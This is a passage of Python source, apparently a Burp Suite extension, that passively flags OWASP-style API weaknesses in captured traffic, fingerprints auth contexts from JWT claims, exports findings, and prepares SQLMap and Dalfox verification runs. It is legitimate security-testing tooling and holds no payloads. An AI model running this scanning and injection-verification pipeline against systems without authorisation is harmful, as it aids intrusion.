                sig = self._passive_body_signature(e.get("response_body", ""))
                if fp not in fp_to_sigs:
                    fp_to_sigs[fp] = set()
                fp_to_sigs[fp].add(sig)

            auth_fps = sorted(fp_to_sigs.keys())
            if sensitive_path and "none" in fp_to_sigs:
                findings.append(
                    {
                        "category": "API5",
                        "severity": "high",
                        "endpoint": endpoint_key,
                        "issue": "Sensitive/admin-like endpoint returns success without explicit auth signal",
                        "evidence": "Success fingerprints: {}".format(", ".join(auth_fps)),
                    }
                )

            if len(auth_fps) >= 2 and sensitive_path:
                shared_sig = None
                all_sigs = [fp_to_sigs.get(fp, set()) for fp in auth_fps]
                if all_sigs:
                    intersection = set(all_sigs[0])
                    for sigs in all_sigs[1:]:
                        intersection &= sigs
                    if intersection:
                        shared_sig = list(intersection)[0]

                if shared_sig:
                    findings.append(
                        {
                            "category": "API5",
                            "severity": "high",
                            "endpoint": endpoint_key,
                            "issue": "Multiple auth contexts received highly similar success responses",
                            "evidence": "Auth contexts: {} | Shared response signature: {}".format(
                                ", ".join(auth_fps), shared_sig[:90]
                            ),
                        }
                    )
                elif method in write_methods:
                    findings.append(
                        {
                            "category": "API5",
                            "severity": "medium",
                            "endpoint": endpoint_key,
                            "issue": "Write/admin-like endpoint succeeds across multiple auth contexts",
                            "evidence": "Auth contexts: {} | Samples: {}".format(
                                ", ".join(auth_fps), len(success_entries)
                            ),
                        }
                    )

        return findings

    def _passive_discover_api3(self, snapshot):
        """Passive API3 data exposure discovery via JSON field-set drift."""
        findings = []
        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            context_fields = self._passive_context_json_fields(entries_list)
            if len(context_fields) < 2:
                continue

            union_fields = set()
            field_sets = list(context_fields.values())
            common_fields = set(field_sets[0])
            for field_set in field_sets:
                union_fields |= set(field_set)
                common_fields &= set(field_set)

            variable_fields = sorted(list(union_fields - common_fields))
            if not variable_fields:
                continue

            min_fields = min([len(x) for x in field_sets])
            max_fields = max([len(x) for x in field_sets])
            sensitive_delta = [
                field for field in variable_fields if self._field_is_sensitive(field)
            ]
            contexts = sorted(list(context_fields.keys()))

            if sensitive_delta:
                findings.append(
                    {
                        "category": "API3",
                        "severity": "high",
                        "endpoint": endpoint_key,
                        "issue": "Cross-context JSON field drift includes sensitive/PII-like attributes",
                        "evidence": "Contexts: {} | Field count range: {}-{} | Sensitive variable fields: {}".format(
                            ", ".join(contexts[:4]),
                            min_fields,
                            max_fields,
                            ", ".join(sensitive_delta[:8]),
                        ),
                    }
                )
            elif (max_fields - min_fields) >= 5 and len(variable_fields) >= 4:
                findings.append(
                    {
                        "category": "API3",
                        "severity": "medium",
                        "endpoint": endpoint_key,
                        "issue": "Large cross-context JSON field drift detected",
                        "evidence": "Contexts: {} | Field count range: {}-{} | Variable fields: {}".format(
                            ", ".join(contexts[:4]),
                            min_fields,
                            max_fields,
                            ", ".join(variable_fields[:8]),
                        ),
                    }
                )

        return findings

    def _entry_param_names_lower(self, entry):
        """Extract request parameter names in lowercase with bounded parsing."""
        names = set()
        params = entry.get("parameters", {}) or {}
        for param_type in ["url", "body", "json", "cookie"]:
            raw = params.get(param_type, [])
            if isinstance(raw, dict):
                iterable = raw.keys()
            elif isinstance(raw, list):
                iterable = raw
            else:
                iterable = []
            count = 0
            for name in iterable:
                if count >= 80:
                    break
                count += 1
                if name is None:
                    continue
                safe_name = self._ascii_safe(name, lower=True).strip()
                if safe_name:
                    names.add(safe_name)

        query = (entry.get("query_string", "") or "")
        if query:
            for part in query.split("&")[:80]:
                if not part:
                    continue
                name = self._ascii_safe(part.split("=", 1)[0], lower=True).strip()
                if name:
                    names.add(name)
        return names

    def _entry_header_names_lower(self, entry):
        """Extract request header names in lowercase with bounded parsing."""
        headers = entry.get("headers", {}) or {}
        out = set()
        count = 0
        for key in headers.keys():
            if count >= 40:
                break
            count += 1
            safe_key = self._ascii_safe(key, lower=True).strip()
            if safe_key:
                out.add(safe_key)
        return out

    def _entry_limit_values(self, entry):
        """Extract numeric pagination limits from query string."""
        query = self._ascii_safe(entry.get("query_string", "") or "", lower=True)
        if not query:
            return []
        values = []
        for value_text in self.PASSIVE_LIMIT_QUERY_PATTERN.findall(query)[:8]:
            try:
                value = int(value_text)
            except (TypeError, ValueError):
                continue
            if value >= 0:
                values.append(value)
        return values

    def _passive_discover_api4(self, snapshot):
        """Passive API4 resource-consumption heuristics from captured history."""
        findings = []
        pagination_keys = set(["limit", "page", "page_size", "pagesize", "offset", "cursor", "per_page"])
        throttled_codes = set([429, 503])

        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            if not entries_list:
                continue
            entry = self._get_entry(entries_list)
            path = self._ascii_safe(entry.get("normalized_path", "") or "", lower=True)
            method = self._ascii_safe(entry.get("method", "") or "").upper()

            success_entries = []
            throttled_count = 0
            max_response_length = 0
            slow_success_count = 0
            max_limit = 0
            param_names = set()

            for sample in entries_list[:40]:
                status = int(sample.get("response_status", 0) or 0)
                if status in throttled_codes:
                    throttled_count += 1
                if 200 <= status < 300:
                    success_entries.append(sample)
                    resp_len = int(sample.get("response_length", 0) or 0)
                    if resp_len > max_response_length:
                        max_response_length = resp_len
                    resp_time = int(sample.get("response_time_ms", 0) or 0)
                    if resp_time >= 4000:
                        slow_success_count += 1
                param_names.update(self._entry_param_names_lower(sample))
                for limit_value in self._entry_limit_values(sample):
                    if limit_value > max_limit:
                        max_limit = limit_value

            if not success_entries:
                continue

            resource_like = bool(self.PASSIVE_RESOURCE_PATH_PATTERN.search(path))
            has_pagination = any(name in pagination_keys for name in param_names)
            if not resource_like and not has_pagination and method not in ["GET", "POST"]:
                continue

            if max_limit >= 1000:
                findings.append(
                    {
                        "category": "API4",
                        "severity": "high",
                        "endpoint": endpoint_key,
                        "issue": "Very large pagination/window value accepted",
                        "evidence": "Max observed limit/size value: {}".format(max_limit),
                    }
                )

            if max_response_length >= 250000 and not has_pagination:
                findings.append(
                    {
                        "category": "API4",
                        "severity": "high",
                        "endpoint": endpoint_key,
                        "issue": "Large successful response without pagination controls",
                        "evidence": "Largest 2xx response length: {} bytes".format(max_response_length),
                    }
                )
            elif max_response_length >= 120000 and not has_pagination:
                findings.append(
                    {
                        "category": "API4",
                        "severity": "medium",
                        "endpoint": endpoint_key,
                        "issue": "Potential unbounded response size",
                        "evidence": "Largest 2xx response length: {} bytes".format(max_response_length),
                    }
                )

            if len(success_entries) >= 12 and throttled_count == 0:
                findings.append(
                    {
                        "category": "API4",
                        "severity": "medium",
                        "endpoint": endpoint_key,
                        "issue": "High success volume observed without throttling signals",
                        "evidence": "2xx samples: {} | 429/503 samples: {}".format(
                            len(success_entries), throttled_count
                        ),
                    }
                )

            if slow_success_count >= 3 and max_response_length >= 120000 and throttled_count == 0:
                findings.append(
                    {
                        "category": "API4",
                        "severity": "medium",
                        "endpoint": endpoint_key,
                        "issue": "Slow heavy responses may enable resource exhaustion",
                        "evidence": "Slow 2xx samples (>=4s): {} | Max length: {}".format(
                            slow_success_count, max_response_length
                        ),
                    }
                )

        return findings

    def _passive_discover_api6(self, snapshot):
        """Passive API6 business-flow authorization heuristics."""
        findings = []
        write_methods = set(["POST", "PUT", "PATCH", "DELETE"])

        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            if not entries_list:
                continue
            entry = self._get_entry(entries_list)
            path = self._ascii_safe(entry.get("normalized_path", "") or "", lower=True)
            method = self._ascii_safe(entry.get("method", "") or "").upper()

            flow_like = bool(self.PASSIVE_FLOW_PATH_PATTERN.search(path))
            if not flow_like and method in write_methods:
                flow_like = any(
                    marker in path
                    for marker in ["/admin", "/role", "/permission", "/billing", "/transfer", "/withdraw", "/approve"]
                )
            if not flow_like:
                continue

            fp_to_sigs = {}
            fp_to_success_count = {}
            for sample in entries_list[:40]:
                status = int(sample.get("response_status", 0) or 0)
                if status < 200 or status >= 300:
                    continue
                fp = self._passive_auth_fingerprint(sample)
                sig = self._passive_body_signature(sample.get("response_body", ""))
                if fp not in fp_to_sigs:
                    fp_to_sigs[fp] = set()
                    fp_to_success_count[fp] = 0
                fp_to_sigs[fp].add(sig)
                fp_to_success_count[fp] += 1

            if not fp_to_sigs:
                continue

            auth_contexts = sorted(fp_to_sigs.keys())
            if "none" in fp_to_sigs:
                findings.append(
                    {
                        "category": "API6",
                        "severity": "critical" if method in write_methods else "high",
                        "endpoint": endpoint_key,
                        "issue": "Sensitive business flow succeeded without explicit auth signal",
                        "evidence": "Auth contexts: {} | unauth success samples: {}".format(
                            ", ".join(auth_contexts),
                            fp_to_success_count.get("none", 0),
                        ),
                    }
                )

            if len(auth_contexts) >= 2:
                all_sigs = [fp_to_sigs.get(fp, set()) for fp in auth_contexts]
                shared_sig = None
                if all_sigs:
                    intersection = set(all_sigs[0])
                    for sigs in all_sigs[1:]:
                        intersection &= sigs
                    if intersection:
                        shared_sig = list(intersection)[0]

                if shared_sig:
                    findings.append(
                        {
                            "category": "API6",
                            "severity": "high",
                            "endpoint": endpoint_key,
                            "issue": "Business-flow responses look identical across auth contexts",
                            "evidence": "Contexts: {} | Shared signature: {}".format(
                                ", ".join(auth_contexts), shared_sig[:90]
                            ),
                        }
                    )
                elif method in write_methods:
                    findings.append(
                        {
                            "category": "API6",
                            "severity": "medium",
                            "endpoint": endpoint_key,
                            "issue": "Write business-flow endpoint succeeded for multiple auth contexts",
                            "evidence": "Contexts: {} | Success samples: {}".format(
                                ", ".join(auth_contexts),
                                sum(fp_to_success_count.values()),
                            ),
                        }
                    )

        return findings

    def _passive_discover_api10(self, snapshot):
        """Passive API10 heuristics for unsafe upstream API consumption."""
        findings = []
        webhook_write_methods = set(["POST", "PUT", "PATCH"])

        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            if not entries_list:
                continue
            entry = self._get_entry(entries_list)
            path = self._ascii_safe(entry.get("normalized_path", "") or "", lower=True)
            method = self._ascii_safe(entry.get("method", "") or "").upper()

            success_entries = []
            param_names = set()
            header_names = set()
            upstream_hints = set()

            for sample in entries_list[:40]:
                status = int(sample.get("response_status", 0) or 0)
                if 200 <= status < 300:
                    success_entries.append(sample)
                param_names.update(self._entry_param_names_lower(sample))
                header_names.update(self._entry_header_names_lower(sample))
                body = self._ascii_safe(sample.get("response_body", "") or "", lower=True)
                for hint in self.PASSIVE_UPSTREAM_ERROR_HINTS:
                    if hint in body:
                        upstream_hints.add(hint)
                        if len(upstream_hints) >= 4:
                            break

            if not success_entries and not upstream_hints:
                continue

            has_external_param = any(
                any(keyword in name for keyword in self.PASSIVE_CALLBACK_PARAM_KEYWORDS)
                for name in param_names
            )
            webhook_like = bool(self.PASSIVE_WEBHOOK_PATH_PATTERN.search(path))
            has_signature = any(
                any(hint in header_name for hint in self.PASSIVE_SIGNATURE_HEADER_HINTS)
                for header_name in header_names
            )

            if has_external_param and success_entries:
                findings.append(
                    {
                        "category": "API10",
                        "severity": "high" if webhook_like else "medium",
                        "endpoint": endpoint_key,
                        "issue": "Endpoint accepts external callback/URL-style input",
                        "evidence": "Param hints: {} | 2xx samples: {}".format(
                            ", ".join(sorted(list(param_names))[:8]),
                            len(success_entries),
                        ),
                    }
                )

            if webhook_like and method in webhook_write_methods and success_entries and not has_signature:
                findings.append(
                    {
                        "category": "API10",
                        "severity": "high",
                        "endpoint": endpoint_key,
                        "issue": "Webhook/callback endpoint observed without signature header signal",
                        "evidence": "Observed headers: {}".format(
                            ", ".join(sorted(list(header_names))[:8]) or "<none>"
                        ),
                    }
                )

            if upstream_hints:
                findings.append(
                    {
                        "category": "API10",
                        "severity": "medium",
                        "endpoint": endpoint_key,
                        "issue": "Responses leak upstream dependency/network failure details",
                        "evidence": "Detected upstream error hints: {}".format(
                            ", ".join(sorted(list(upstream_hints))[:6])
                        ),
                    }
                )

        return findings

    def _passive_context_json_fields(self, entries_list):
        """Build auth-context -> union JSON fields from successful responses."""
        context_fields = {}
        for entry in entries_list:
            status = int(entry.get("response_status", 0) or 0)
            if status < 200 or status >= 300:
                continue
            parsed = self._parse_json_loose(entry.get("response_body", ""))
            if parsed is None:
                continue
            paths = set()
            self._flatten_json_paths(parsed, "", paths, 0)
            if not paths:
                continue
            context = self._passive_auth_fingerprint(entry)
            if context not in context_fields:
                context_fields[context] = set()
            context_fields[context].update(paths)
        return context_fields

    def _passive_discover_api9(self, snapshot):
        """Passive API9 shadow/version drift detection."""
        findings = []
        groups = {}

        for endpoint_key, entries in snapshot.items():
            entries_list = entries if isinstance(entries, list) else [entries]
            if not entries_list:
                continue
            entry = self._get_entry(entries_list)
            method = self._ascii_safe(entry.get("method", "") or "").upper()
            path = self._ascii_safe(entry.get("normalized_path", "") or "")
            version_token = self._extract_version_segment(path)
            if not version_token:
                continue
            version_value = self._parse_version_value(version_token)
            if version_value is None:
                continue
            versionless = self._strip_version_segment(path, version_token)
            group_key = "{}:{}".format(method, versionless)
            if group_key not in groups:
                groups[group_key] = []
            groups[group_key].append(
                {
                    "endpoint": endpoint_key,
                    "version_token": version_token,
                    "version_value": version_value,
                    "entries": entries_list,
                }
            )

        for group_key, versions in groups.items():
            if len(versions) < 2:
                continue

            versions.sort(key=lambda x: x["version_value"])
            for version_data in versions:
                entries_data = version_data.get("entries", [])
                version_data["has_success"] = self._has_success_response(entries_data)
                version_data["fields"] = self._passive_union_json_fields(entries_data)
            latest = versions[-1]
            latest_fields = latest.get("fields", set())
            latest_success = bool(latest.get("has_success"))

            for older in versions[:-1]:
                older_success = bool(older.get("has_success"))
                if not (latest_success and older_success):
                    continue

                findings.append(
                    {
                        "category": "API9",
                        "severity": "medium",
                        "endpoint": older.get("endpoint", group_key),
                        "issue": "Legacy API version remains active alongside newer version",
                        "evidence": "Legacy: {} | Latest: {} | Group: {}".format(
                            older.get("version_token", ""),
                            latest.get("version_token", ""),
                            group_key,
                        ),
                    }
                )

                older_fields = older.get("fields", set())
                if not older_fields or not latest_fields:
                    continue

                legacy_only = sorted(list(older_fields - latest_fields))
                if not legacy_only:
                    continue
                sensitive_legacy = [
                    field for field in legacy_only if self._field_is_sensitive(field)
                ]
                if sensitive_legacy:
                    findings.append(
                        {
                            "category": "API9",
                            "severity": "high",
                            "endpoint": older.get("endpoint", group_key),
                            "issue": "Legacy version exposes sensitive fields absent in newer version",
                            "evidence": "Legacy-only sensitive fields: {}".format(
                                ", ".join(sensitive_legacy[:8])
                            ),
                        }
                    )
                elif len(legacy_only) >= 4:
                    findings.append(
                        {
                            "category": "API9",
                            "severity": "medium",
                            "endpoint": older.get("endpoint", group_key),
                            "issue": "Versioned response schema drift detected",
                            "evidence": "Legacy-only fields: {}".format(
                                ", ".join(legacy_only[:8])
                            ),
                        }
                    )

        return findings

    def _passive_union_json_fields(self, entries):
        fields = set()
        entries_list = entries if isinstance(entries, list) else [entries]
        for entry in entries_list:
            status = int(entry.get("response_status", 0) or 0)
            if status < 200 or status >= 300:
                continue
            parsed = self._parse_json_loose(entry.get("response_body", ""))
            if parsed is None:
                continue
            self._flatten_json_paths(parsed, "", fields, 0)
        return fields

    def _has_success_response(self, entries):
        entries_list = entries if isinstance(entries, list) else [entries]
        for entry in entries_list:
            status = int(entry.get("response_status", 0) or 0)
            if 200 <= status < 300:
                return True
        return False

    def _passive_auth_fingerprint(self, entry):
        headers = entry.get("headers", {}) or {}
        normalized = {}
        for key, value in headers.items():
            normalized[self._ascii_safe(key, lower=True)] = self._ascii_safe(value)

        authz = normalized.get("authorization", "").strip()
        if authz:
            lowered = authz.lower()
            if lowered.startswith("bearer "):
                token = authz.split(" ", 1)[1].strip()
                jwt_identity = self._passive_jwt_identity(token)
                if jwt_identity:
                    return jwt_identity
                return "bearer:" + token[:16]
            return "authorization:" + authz[:20]

        api_key = normalized.get("x-api-key", "").strip()
        if api_key:
            return "x-api-key:" + api_key[:12]

        cookie = normalized.get("cookie", "").strip()
        if cookie:
            names = []
            for part in cookie.split(";"):
                part = part.strip()
                if "=" in part:
                    names.append(self._ascii_safe(part.split("=", 1)[0], lower=True).strip())
            names = sorted(list(set(names)))
            return "cookie:" + ",".join(names[:4])

        auth_types = [
            self._ascii_safe(x, lower=True)
            for x in (entry.get("auth_detected", []) or [])
        ]
        if any(x != "none" for x in auth_types):
            return "auth:" + "|".join(sorted(list(set(auth_types))))
        return "none"

    def _passive_jwt_identity(self, token):
        """Derive stable identity fingerprint from JWT claims when possible."""
        import base64
        import binascii

        try:
            text_types = (basestring,)
        except NameError:
            text_types = (str,)

        parts = (token or "").strip().split(".")
        if len(parts) != 3:
            return None
        payload_part = parts[1]
        if not payload_part:
            return None

        padding = "=" * (-len(payload_part) % 4)
        try:
            payload_bytes = base64.urlsafe_b64decode(payload_part + padding)
            payload_obj = json.loads(payload_bytes)
        except (TypeError, ValueError, binascii.Error):
            return None

        role = payload_obj.get("role")
        roles = payload_obj.get("roles")
        is_admin = payload_obj.get("is_admin")
        subject = payload_obj.get("sub")
        user_id = payload_obj.get("user_id")
        tenant = payload_obj.get("tenant")

        if isinstance(role, text_types + (int, float)):
            return "jwt-role:{}".format(self._ascii_safe(role, lower=True, max_len=24))
        if isinstance(roles, list) and roles:
            role_text = ",".join([self._ascii_safe(x, lower=True) for x in roles[:4]])
            return "jwt-roles:{}".format(role_text[:32])
        if isinstance(is_admin, bool):
            return "jwt-admin:{}".format("true" if is_admin else "false")
        if isinstance(subject, text_types + (int, float)):
            return "jwt-sub:{}".format(self._ascii_safe(subject, lower=True, max_len=24))
        if isinstance(user_id, text_types + (int, float)):
            return "jwt-user:{}".format(self._ascii_safe(user_id, lower=True, max_len=24))
        if isinstance(tenant, text_types + (int, float)):
            return "jwt-tenant:{}".format(self._ascii_safe(tenant, lower=True, max_len=24))
        return None

    def _passive_body_signature(self, body_text):
        body = self._ascii_safe(body_text or "", lower=True)
        body = re.sub(r"\s+", " ", body).strip()
        body = re.sub(r"[0-9a-f]{24,}", "{token}", body)
        body = re.sub(r"\d+", "0", body)
        if not body:
            return "empty"
        return "{}:{}".format(len(body), body[:120])

    def _parse_json_loose(self, body_text):
        text = (body_text or "").strip()
        if not text:
            return None
        if text.startswith(")]}',"):
            parts = text.split("\n", 1)
            if len(parts) == 2:
                text = parts[1].strip()
            else:
                return None
        if not text or text[0] not in ["{", "["]:
            return None
        text = text.rstrip(" ;")
        try:
            return json.loads(text)
        except ValueError:
            return None

    def _flatten_json_paths(self, value, prefix, out, depth):
        if depth > 6:
            return
        if isinstance(value, dict):
            count = 0
            for key in sorted(value.keys()):
                if count >= 80:
                    break
                count += 1
                key_str = self._ascii_safe(key)
                path = key_str if not prefix else "{}.{}".format(prefix, key_str)
                out.add(path)
                self._flatten_json_paths(value.get(key), path, out, depth + 1)
            return
        if isinstance(value, list):
            path = "[]" if not prefix else "{}[]".format(prefix)
            out.add(path)
            for item in value[:5]:
                self._flatten_json_paths(item, path, out, depth + 1)
            return
        if prefix:
            out.add(prefix)
        else:
            out.add("<root>")

    def _field_is_sensitive(self, field_path):
        lower = self._ascii_safe(field_path, lower=True)
        return any(word in lower for word in self.PASSIVE_SENSITIVE_FIELD_KEYWORDS)

    def _extract_version_segment(self, path):
        match = self.PASSIVE_VERSION_SEGMENT_PATTERN.search((path or "").lower())
        if match:
            return match.group(1)
        return None

    def _strip_version_segment(self, path, version_token):
        stripped = re.sub(
            r"/" + re.escape(version_token) + r"(?=/|$)",
            "",
            path or "",
            count=1,
        )
        return stripped if stripped else "/"

    def _parse_version_value(self, version_token):
        token = (version_token or "").lower().lstrip("v")
        if not token:
            return None
        parts = token.split(".", 1)
        try:
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
            return (major, minor)
        except (TypeError, ValueError):
            return None

    def _format_passive_discovery_output(
        self, findings, scanned_count, total_available, mode
    ):
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "info": 0}
        category_counts = {
            "API3": 0,
            "API4": 0,
            "API5": 0,
            "API6": 0,
            "API9": 0,
            "API10": 0,
        }
        for finding in findings:
            sev = self._ascii_safe(finding.get("severity", "info"), lower=True)
            cat = self._ascii_safe(finding.get("category", ""))
            if sev in severity_counts:
                severity_counts[sev] += 1
            if cat in category_counts:
                category_counts[cat] += 1

        lines = []
        lines.append("=" * 80)
        lines.append("PASSIVE DISCOVERY RESULTS")
        lines.append("=" * 80)
        lines.append("[*] Mode: {}".format(self._ascii_safe(mode)))
        lines.append("[*] Endpoints Scanned: {} (of {})".format(scanned_count, total_available))
        lines.append("[*] Findings: {}".format(len(findings)))
        lines.append(
            "[*] Severity: Critical={} High={} Medium={} Info={}".format(
                severity_counts["critical"],
                severity_counts["high"],
                severity_counts["medium"],
                severity_counts["info"],
            )
        )
        lines.append(
            "[*] Categories: API3={} API4={} API5={} API6={} API9={} API10={}".format(
                category_counts["API3"],
                category_counts["API4"],
                category_counts["API5"],
                category_counts["API6"],
                category_counts["API9"],
                category_counts["API10"],
            )
        )
        lines.append("")

        if not findings:
            lines.append("[+] No passive gap signals detected in current history")
            lines.append("[*] Capture more role/version traffic and rerun")
            return "\n".join(lines) + "\n"

        lines.append("TOP FINDINGS")
        lines.append("-" * 80)
        for finding in findings[:120]:
            severity = self._ascii_safe(
                finding.get("severity", "info"), lower=True
            ).upper()
            category = self._ascii_safe(finding.get("category", "GEN"))
            issue = self._ascii_safe(finding.get("issue", ""))
            endpoint = self._ascii_safe(finding.get("endpoint", ""))
            evidence = self._ascii_safe(finding.get("evidence", ""))
            lines.append(
                "[{}][{}] {}".format(
                    severity,
                    category,
                    issue,
                )
            )
            lines.append("  Endpoint: {}".format(endpoint))
            lines.append("  Evidence: {}".format(evidence))
            lines.append("")
        if len(findings) > 120:
            lines.append("[*] {} more findings not shown".format(len(findings) - 120))

        return "\n".join(lines) + "\n"

    def _export_passive_discovery_results(self):
        """Export passive findings to JSON."""
        with self.passive_discovery_lock:
            findings = list(self.passive_discovery_findings or [])
        if not findings:
            self.passive_area.append("\n[!] No passive findings to export\n")
            return

        import os

        export_dir = self._get_export_dir("PassiveDiscovery_Export")
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "passive_discovery_findings.json")
        writer = None
        try:
            payload = {
                "metadata": {
                    "timestamp": SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date()),
                    "finding_count": len(findings),
                    "source": "proxy_history_passive",
                },
                "findings": findings,
            }
            writer = FileWriter(filepath)
            writer.write(json.dumps(payload, indent=2))
            self.passive_area.append(
                "\n[+] Exported {} passive findings\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(findings), export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported passive discovery findings to: {}".format(export_dir))
        except Exception as e:
            self.passive_area.append("\n[!] Passive export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] Passive export failed: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as close_err:
                    self._callbacks.printError(
                        "Error closing passive discovery export file: {}".format(
                            str(close_err)
                        )
                    )

    def _normalize_wayback_entry(self, line):
        """Normalize wayback line into: original | archive | timestamp."""
        cleaned = self._clean_url(line)
        if not cleaned:
            return None

        parts = [p.strip() for p in cleaned.split(" | ")]
        if len(parts) >= 3:
            return "{} | {} | {}".format(parts[0], parts[1], parts[2])

        return "{} | {} | custom".format(cleaned, cleaned)

    def _run_httpx(self, event):
        """Run HTTPX on discovered URLs from Recon tab"""
        return heavy_runners._run_httpx(self, event)

    def _export_list_to_file(self, data_list, export_type, output_area, list_name):
        """Helper to export list to file - only called on explicit export"""
        import os

        if not data_list:
            output_area.append("\n[!] No {} to export\n".format(list_name))
            return
        export_dir = self._get_export_dir(export_type)
        if not export_dir:
            return
        filepath = os.path.join(export_dir, "results.txt")
        writer = None
        try:
            writer = FileWriter(filepath)
            for item in data_list:
                writer.write(item + "\n")
            output_area.append(
                "\n[+] Exported {} {}\n[+] Folder: {}\n[+] File: {}\n".format(
                    len(data_list), list_name, export_dir, filepath
                )
            )
            self.log_to_ui("[+] Exported {} to: {}".format(list_name, export_dir))
        except Exception as e:
            output_area.append("\n[!] Export failed: {}\n".format(str(e)))
            self.log_to_ui("[!] Export error: {}".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as e:
                    self._callbacks.printError(
                        "Error closing file {}: {}".format(filepath, str(e))
                    )

    def _parse_positive_int(self, text, default_value, min_value, max_value):
        """Parse bounded positive integer from UI text fields."""
        try:
            value = int((text or "").strip())
        except (TypeError, ValueError):
            value = int(default_value)
        if value < min_value:
            value = min_value
        if value > max_value:
            value = max_value
        return value

    def _collect_verify_targets(self, attack_types, max_targets):
        """Collect verification targets from fuzzer attacks, fallback to API-like endpoints."""
        targets = []
        seen_urls = set()
        wanted = set([self._ascii_safe(x, lower=True) for x in (attack_types or [])])
        with self.lock:
            data_snapshot = dict(self.api_data)
        attacks_snapshot = list(getattr(self, "fuzzing_attacks", []) or [])

        for endpoint_key, attack in attacks_snapshot:
            attack_type = self._ascii_safe((attack or {}).get("type"), lower=True)
            if wanted and attack_type not in wanted:
                continue
            entries = data_snapshot.get(endpoint_key)
            if not entries:
                continue
            entry = self._get_entry(entries)
            url, _, _, _, _ = self._build_entry_url(entry)
            if not url or url in seen_urls:
                continue
            params = []
            for param_name in (attack.get("params", []) or []):
                safe_param = self._ascii_safe(param_name).strip()
                if safe_param:
                    params.append(safe_param)
            body_data = self._ascii_safe(entry.get("request_body") or "")
            candidate = {
                "endpoint_key": endpoint_key,
                "url": url,
                "method": self._ascii_safe(entry.get("method") or "GET").upper(),
                "params": params,
                "data": body_data,
            }
            targets.append(candidate)
            seen_urls.add(url)
            if len(targets) >= max_targets:
                return targets

        # Fallback: no fuzzing context yet, pick likely API endpoints.
        api_endpoints, _ = self._collect_fuzzer_targets()
        for endpoint_key, entries in sorted(api_endpoints.items(), key=lambda item: item[0]):
            entry = self._get_entry(entries)
            url, _, _, _, _ = self._build_entry_url(entry)
            if not url or url in seen_urls:
                continue
            method = self._ascii_safe(entry.get("method") or "GET").upper()
            if method not in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
                continue
            params_block = entry.get("parameters", {}) or {}
            param_names = []
            for ptype in ["url", "body", "json"]:
                values = params_block.get(ptype, {})
                if isinstance(values, dict):
                    param_names.extend([self._ascii_safe(k) for k in values.keys()])
                elif isinstance(values, list):
                    param_names.extend([self._ascii_safe(v) for v in values])
            if method == "GET" and not param_names:
                continue
            candidate = {
                "endpoint_key": endpoint_key,
                "url": url,
                "method": method,
                "params": [p for p in param_names if p][:8],
                "data": self._ascii_safe(entry.get("request_body") or ""),
            }
            targets.append(candidate)
            seen_urls.add(url)
            if len(targets) >= max_targets:
                break
        return targets

    def _extract_sqlmap_evidence(self, output_text):
        """Extract SQLMap positive evidence line from command output."""
        safe = self._ascii_safe(output_text or "", lower=True)
        for line in safe.splitlines():
            compact = line.strip()
            if not compact:
                continue
            if (
                "is vulnerable" in compact
                or "injectable" in compact
                or "sql injection vulnerability" in compact
            ):
                return self._ascii_safe(line).strip()
        return ""

    def _extract_dalfox_evidence(self, output_text):
        """Extract Dalfox positive evidence line from output."""
        safe = self._ascii_safe(output_text or "", lower=True)
        for line in safe.splitlines():
            compact = line.strip()
            if not compact:
                continue
            if (
                "verified" in compact
                or "poc" in compact
                or "xss" in compact and "found" in compact
            ):
                return self._ascii_safe(line).strip()
        return ""

    def _import_endpoint_candidates_to_recon(self, candidates, source_tag, output_area):
        """Import URL/method candidates to Recon tab and tag them by source."""
        if not candidates:
            output_area.append("\n[!] No candidates available to send\n")
            return

        imported = 0
        skipped = 0
        for candidate in candidates:
            try:
                method = self._ascii_safe(candidate.get("method") or "GET").upper()
                url = self._ascii_safe(candidate.get("url") or "").strip()
                if not url:
                    skipped += 1
                    continue
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "https://" + url
                parsed = URL(url)
                path = parsed.getPath() or "/"
                normalized = self._normalize_path(path)
                key = "{}:{}".format(method, normalized)

                with self.lock:
                    if key in self.api_data:
                        skipped += 1
                        continue
                    protocol = parsed.getProtocol() or "https"
                    port = parsed.getPort()
                    if port == -1:
                        port = 443 if protocol == "https" else 80
                    entry = {
                        "method": method,
                        "path": path,
                        "normalized_path": normalized,
                        "host": parsed.getHost(),
                        "protocol": protocol,
                        "port": port,
                        "query_string": parsed.getQuery() or "",
                        "parameters": {"url": {}, "body": {}, "cookie": {}, "json": {}},
                        "headers": {},
                        "request_body": "",
                        "response_status": 200,
                        "response_headers": {},
                        "response_body": "",
                        "response_length": 0,
                        "response_time_ms": 0,
                        "content_type": "unknown",
                        "auth_detected": ["None"],
                        "api_patterns": [self._ascii_safe(source_tag)],
                        "jwt_detected": None,
                        "encryption_indicators": {"likely_encrypted": False, "types": []},
                        "param_patterns": {"reflected": [], "param_types": {}},
                    }
                    self.api_data[key] = [entry]
                    self.endpoint_tags[key] = [self._ascii_safe(source_tag, lower=True)]
                    self.endpoint_times[key] = [0]
                    imported += 1
            except Exception as e:
                skipped += 1
                self._callbacks.printError(
                    "Import candidate failed ({}): {}".format(source_tag, str(e))
                )

        output_area.append(
            "\n[+] Imported {} new endpoints from {}\n".format(
                imported, self._ascii_safe(source_tag)
            )
        )
        output_area.append("[*] Skipped: {}\n".format(skipped))
        self.log_to_ui(
            "[+] Imported {} endpoints from {}".format(
                imported, self._ascii_safe(source_tag)
            )
        )
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def _run_sqlmap_verify(self, event):
        """Run SQLMap verification over SQLi candidates."""
        import os
        import subprocess
        import tempfile
        import time as time_module

